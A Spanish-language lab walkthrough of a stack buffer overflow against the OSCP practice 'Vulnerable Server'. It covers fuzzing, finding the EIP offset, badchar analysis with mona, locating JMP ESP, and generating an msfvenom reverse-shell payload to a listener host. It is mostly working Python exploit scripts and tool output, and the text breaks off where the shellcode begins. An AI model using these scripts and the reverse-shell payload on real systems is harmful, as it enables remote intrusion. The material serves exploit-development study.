\u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1274 + eip_ret + nops + badchars + padding * (??? - ??? - 4 - 255) # 255 badchars try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW4 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Shellcode_final\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toverflow.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 # Shellcode shellcode = () eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x???) padding = \u0026#34;C\u0026#34; nops = \u0026#34;\\x90\u0026#34; * 16 buff = \u0026#34;A\u0026#34; * ??? + eip_ret + nops + shellcode + padding * (??? - ??? - 4 - ???) # junk ???, eip 4, nops 16, shellcode ???, padding ??? = ??? try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW1 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Error.\u0026#34;) Overflow 1 Ejecución El ejecutable esta a la escucha por el puerto 1337 por lo que realizamos una prueba de conexión inicial para verificar y encontrar los diferentes inputs y/o parametros. En este caso vamos a utilizar netcat para realizar la conexión por el puerto mencionado, hay que mencionar que el ejecutable contiene los diez ejercicios/retos por lo que para el primero observamos que tiene como \u0026ldquo;input\u0026rdquo; OVERFLOW1 seguido del valor que podemos enviar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ➜ OVERFLOW_1 nc 192.168.22.128 1337 Welcome to OSCP Vulnerable Server! Enter HELP for help. HELP Valid Commands: HELP OVERFLOW1 [value] OVERFLOW2 [value] OVERFLOW3 [value] OVERFLOW4 [value] OVERFLOW5 [value] OVERFLOW6 [value] OVERFLOW7 [value] OVERFLOW8 [value] OVERFLOW9 [value] OVERFLOW10 [value] EXIT OVERFLOW1 1234567890 OVERFLOW1 COMPLETE Fuzzing Utilizamos este pequeño script en python donde es necesario pasarle la dirección IP para realizar distintas conexiones por medio de sockets enviando distintos tamaños de string que contienen unicamente la letra \u0026ldquo;A\u0026rdquo;, para ver a que punto y tamaño de string el programa se detiene.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toscp1.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 # Fuzzing buff = [\u0026#34;A\u0026#34;] c = 100 while len(buff) \u0026lt; 20: buff.append(\u0026#34;A\u0026#34;*c) c += 100 for string in buff: try: log.info(\u0026#34;Enviando %s bytes.\u0026#34; % len(string)) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW1 %s\\r\\n\u0026#34; % string) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo con %s bytes.\u0026#34; % len(string)) Antes de realizar la ejecución le damos permisos necesarios.\n1 2 3 ➜ OVERFLOW_1 ls overflow1.py ➜ OVERFLOW_1 chmod +x overflow1.py Ejecutamos el script y vemos que ya no puede realizar ninguna conexión al rededor de los 2100 bytes.\n1 2 3 4 ➜ OVERFLOW_1 ./overflow1.py 192.168.22.128 [/] Progreso: Enviando 2100 bytes. [-] Parece que el programa se detuvo con 2100 bytes. ➜ OVERFLOW_1 Vemos en el debugger, que el programa esta pausado o se detuvo y, en los registros de memoria se observa que el valor de EIP se ha sobreescrito con múltiples \u0026ldquo;A\u0026quot;s en valor hexadecimal (41414141), en el ESP se observan múltiples \u0026ldquo;A\u0026quot;s.\nOffset EIP Para controlar el flujo de la aplicación es necesario controlar el registro EIP ya que este apunta a la siguiente instrucción, para ello debemos de conocer el offset exacto. Para encontrar este valor vamos a utilizar pattern_create.rb de metasploit el cual nos permite crear un único patron de caracteres según el tamaño indicado. Sabemos que el programa se detuvo con 2100 bytes vamos aumentar el tamaño del patron.\n1 2 3 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ ./pattern_create.rb -l 2200 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C Modificamos el script de tal forma que realice únicamente una conexión para enviar nuestro patron.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toscp1.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 # Patron buff = \u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C\u0026#34; try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW1 %s\\r\\n\u0026#34; % buff) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34;) Antes de ejecutar nuestro script nuevamente ejecutamos el fichero, realizando CTRL + F2 y F9, o en el icono como se muestra en la imagen y \u0026ldquo;play\u0026rdquo;.\nTras ejecutar el script el programa se detiene, vemos en los registro que ahora ya no existen valores \u0026ldquo;A\u0026rdquo; (41414141), ya que enviamos un patron único. Tomamos el valor de EIP 6F43396E.\nCon el script pattern_offset.rb podemos obtener el valor exacto del offset, pasando el valor de EIP y la longitud de nuestro patron anteriormente creado. Tras ejecutar el script este muestra que el valor exacto del offset es 1978 bytes.\n1 2 3 4 5 6 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ ./pattern_offset.rb -q 6F43396E -l 2200 [*] Exact match at offset 1978 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ De igual forma podemos conocer el offset utilizando mona viendo el offset del registro EIP.\n1 !mona findmsp -distance 2200 Control EIP Sabiendo el offset exacto vamos a tomar el control del registro EIP. Para ello modificamos el script tomando en cuenta el offset encontrado y a este le agregamos el valor de \u0026ldquo;B\u0026quot;s exactamente cuatro bytes, para verificar que el offset sea exacto y, que el valor de este caracter (B) aparezca en el registro EIP, esto nos indicaría que tenemos el control del EIP, tambien agregamos un padding para mantener la longitud del buffer que anteriormente generamos (2200 bytes).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # ./pattern_create.rb -l 2200 # buff = 1978 + 4 + 218 = 2200 # EIP eip_ret = \u0026#34;B\u0026#34; * 4 padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1978 + eip_ret + padding * (2200-1978-4) try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW1 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Error.\u0026#34;) Tras la ejecución del script vemos que el registro EIP vale \u0026ldquo;B\u0026rdquo; en hexadecimal (42424242) lo cual confirma que tenemos el control del EIP. Además vemos que el registro ESP esta lleno de nuestro padding \u0026ldquo;C\u0026rdquo; en hexadecimal (43434343\u0026hellip;).\nEspacio - Shellcode Ahora que confirmamos que tenemos el control de EIP, necesitamos encontrar más espacio para nuestro shellcode ya que los 218 bytes restantes de los 2200 no serán suficientes ya que nuestro shellcode podria superar los 450 bytes. Para ello simplemente agregamos más \u0026ldquo;C\u0026quot;s y vemos si la aplicacion sigue el mismo comportamiento de antes. Para estar seguros agregamos un padding en total de 500 bytes.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # espacio shellcode eip_ret = \u0026#34;B\u0026#34; * 4 padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1978 + eip_ret + padding * (2200-1978-4 + 284) # (218) + 282 = 500 # 1978 (junk) + eip_ret (4) + padding (500) # Total bytes = 2482 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW1 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Error.\u0026#34;) Tras ejecutar el script vemos que el programa sigue comportandose de la misma forma, observamos el registro ESP lleno de \u0026ldquo;C\u0026quot;s y el registro EIP con \u0026ldquo;B\u0026quot;s como antes.\nBadChars Antes de generar nuestro shellcode debemos de identificar los \u0026ldquo;badchars\u0026rdquo;, estos son los caracteres que podrian interferir en la ejecución de nuestro shellcode o no ser aceptados. Existen algunos \u0026ldquo;badchars\u0026rdquo; que comunmente se omiten:\nHexadecimal Representación 00 NULL 0a Salto de linea \u0026rsquo;\\n\u0026rsquo; 0d Retorno de carro \u0026rsquo;\\r\u0026rsquo; 20 Espacio Para identificarlos primero generamos un string con todos los caracteres. Vamos a usar el siguiente comando con mona en el debugger, omitimos el primer badchar.\n1 !mona bytearray -cpb \u0026#34;\\x00\u0026#34; Vemos en la salida del comando todos los caracteres, además se muestran dos ficheros, el primero contiene todos los badchars los cuales vamos a copiar a nuestro script, el segundo tiene el mismo contenido pero nos servirá para identificar los badchars.\nModificamos el script agregando antes del padding y compensamos la cantidad restante con \u0026ldquo;C\u0026quot;s para mantener la longitud anteriormente encontrada (2482).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # Badchars badchars = ( \u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\u0026#34; \u0026#34;\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\u0026#34; \u0026#34;\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\u0026#34; \u0026#34;\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\u0026#34; \u0026#34;\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\u0026#34; \u0026#34;\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\u0026#34; \u0026#34;\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\u0026#34; \u0026#34;\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) eip_ret = \u0026#34;B\u0026#34;*4 padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1978 + eip_ret + badchars + padding * (2482-1978-4-255) # 1978 junk, eip 4, 255 badchars, 245 padding # Total bytes = 2482 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW1 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Error.\u0026#34;) Tras ejecutar el script vemos que el programa se detuvo, en este punto tomamos el valor del registro ESP (o simplemente esp), y utilizando mona identificamos los badchar con el fichero bytearray.bin.\n1 2 !mona compare -f C:\\bof\\oscp\\bytearray.bin -a \u0026lt;ESP-address\u0026gt; !mona compare -f C:\\bof\\oscp\\bytearray.bin -a esp Vemos en el output que se muestran \u0026ldquo;posibles badchars\u0026rdquo;, estos son los valores que debemos de tomar y nuevamente crear un array omitiendo uno por uno.\n1 !mona bytearray -cpb \u0026#34;\\x00\\x07\u0026#34; Tras generar un nuevo array, modificamos el script, y con mona nuevamente identificamos los badchars. Vemos el valor 2e.\nNuevamente creamos un nuevo array, omitiendo el valor \\x2e.\n1 !mona bytearray -cpb \u0026#34;\\x00\\x07\\x2e\u0026#34; Observamos el valor a0\nNuevamente creamos un nuevo array, omitiendo el valor \\xa0.\n1 !mona bytearray -cpb \u0026#34;\\x00\\x07\\x2e\\xa0\u0026#34; Esta vez ya no se muestra ninguno, por lo que logramos identificar todos los badchars (\u0026quot;\\x00\\x07\\x2e\\xa0\u0026quot;).\nChars Algunos \u0026ldquo;badchars\u0026rdquo; suelen corromper el siguiente por ejemplo el valor \\x00 podria corromper al valor \\x01, el cual no es comun encontrar como badchar, en el caso anterior vemos el valor \\x07, al igual que el valor \\x01 no suele ser un badchar, si creamos un nuevo array incluyendo este valor, mona no muestra que sea un badchar.\nJMP ESP El registro ESP se ha llenado de la información que hemos estado enviando (\u0026ldquo;A\u0026quot;s, patron único y badchars) y es donde vamos a almacenar nuestro shellcode, pero para ello debemos de encontrar una forma de redirigir el flujo del programa al ESP, teniendo el control del registro EIP debemos decirle que apunte al ESP. Por ello, debemos de localizar la instruccion JMP ESP dentro del ejecutable o los modulos que este utiliza. El script nasm_shell.rb nos puede ayudar a encontrar el valor en hexadecimal de esta instrucción.\n1 2 3 4 5 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ ./nasm_shell.rb nasm \u0026gt; JMP ESP 00000000 FFE4 jmp esp nasm \u0026gt; Tomamos el valor FFE4 el cual vamos a buscar en uno de los modulos que el ejecutable utiliza. Primero, buscamos algun modulo que no tenga ningun tipo de proteccion habilitada, vemos dos incluyendo el ejecutable.\nAhora debemos de localizar la instruccion FFE4 dentro de este modulo omitiendo los badchars.\n1 !mona find -s \u0026#34;\\xff\\xe4\u0026#34; -m essfunc.dll -cpb \u0026#34;\\x00\\x07\\x2e\\xa0\u0026#34; Observamos multiples direcciones que contienen dicha instrucción.\nPara verificar que estas direcciónes contengan la instrucción que buscamos, vamos a la dirección dada y vemos la instrucción JMP ESP.\nDe igual forma podemos utilizar mona con los siguientes comando para encontrar la instrucción.\n1 2 !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x07\\x2e\\xa0\u0026#34; !mona jmp -r esp -cpb \u0026#34;\\x00\\x07\\x2e\\xa0\u0026#34; Con ello modificamos nuestro script agregando la dirección en lugar de las \u0026ldquo;B\u0026quot;s en formato Little Endian con la libreria struct.\n1 2 3 from struct import pack eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x625011AF) Shellcode El registro EIP apunta (JMP ESP) al ESP, y en este ultimo podemos agregar la información que queremos, vamos a agregar finalmente nuestro shellcode en lugar de los badchars o \u0026ldquo;C\u0026quot;s como ya lo hemos hecho. Utilizando msfvenom creamos un shellcode en formato C especificando los badchars.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.22.1 LPORT=1338 -a x86 --platform windows -f c -b \u0026#34;\\x00\\x07\\x2e\\xa0\u0026#34; Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 351 (iteration=0) x86/shikata_ga_nai chosen with final size 351 Payload size: 351 bytes Final size of c file: 1500 bytes unsigned char buf[] = 